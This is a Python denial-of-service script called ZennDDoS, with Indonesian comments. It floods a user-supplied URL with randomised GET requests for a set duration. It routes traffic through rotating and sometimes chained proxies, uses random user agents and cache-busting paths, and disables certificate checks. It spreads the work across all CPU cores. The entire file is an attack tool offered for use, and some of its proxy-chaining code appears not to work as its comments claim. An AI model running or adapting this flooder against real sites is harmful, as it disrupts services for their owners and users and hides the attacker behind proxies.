import asyncio
import httpx
import ssl
import random
import sys
import time
import string
from aiomultiprocess import Pool
from aiohttp import ClientSession, TCPConnector


# Cek argumen
if len(sys.argv) < 5:
    print("Usage: python ZennDDoS.py URL TIME REQ_PER_SEC THREADS\nExample: python ZennDDoS.py https://target.xyz 600 10 8")
    sys.exit()

# Parameter
target_url = sys.argv[1]
duration = int(sys.argv[2])
rate = int(sys.argv[3])
threads_count = int(sys.argv[4])

proxies = open("proxy.txt", "r").read().splitlines()
user_agents = open("ua.txt", "r").read().splitlines()


# Konfigurasi ZennDDoS
def create_ssl_context():
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    context.set_ciphers(
        "GREASE:!aNULL:!eNULL:ECDHE+AESGCM:ECDHE+CHACHA20:ECDHE+RSA+AESGCM"
    )
    context.set_ecdh_curve("GREASE:X25519:P-256:P-384")
    return context


# Generate random path dan parameter
def random_path():
    return "/" + "".join(random.choices(string.ascii_letters + string.digits, k=8)) + "?" + \
           "".join(random.choices(string.ascii_lowercase, k=5)) + "=" + \
           "".join(random.choices(string.ascii_letters + string.digits, k=10))


# Random header
def generate_headers():
    return {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Referer": target_url,
        "Cache-Control": "no-cache",
        "Upgrade-Insecure-Requests": "1"
    }


# Flooder async dengan proxy chaining
async def flood_request(session, proxy_chain):
    target = target_url + random_path()
    headers = generate_headers()
    try:
        async with session.get(target, proxy=proxy_chain, headers=headers, timeout=10) as response:
            await response.read()
    except Exception:
        pass


# Flooder batch (mengirimkan 1000+ request sekaligus)
async def batch_flooder(proxy_list):
    ssl_context = create_ssl_context()
    connector = TCPConnector(ssl=ssl_context, limit_per_host=rate)

    async with ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(rate):
            proxy_chain = random.choice(proxies)
            if random.random() > 0.5:  # 50% chance pakai 2 proxy
                proxy_chain += "," + random.choice(proxies)
            tasks.append(flood_request(session, proxy_chain))
        await asyncio.gather(*tasks)


# Multiprocessing flooder (Memanfaatkan semua core CPU)
async def process_flooding():
    proxy_batch = [proxies for _ in range(threads_count)]
    async with Pool() as pool:
        await pool.map(batch_flooder, proxy_batch)


# Menjalankan flooder selama <duration> detik
async def run_flooder_for(duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        await process_flooding()


if __name__ == "__main__":
    asyncio.run(run_flooder_for(duration))
  
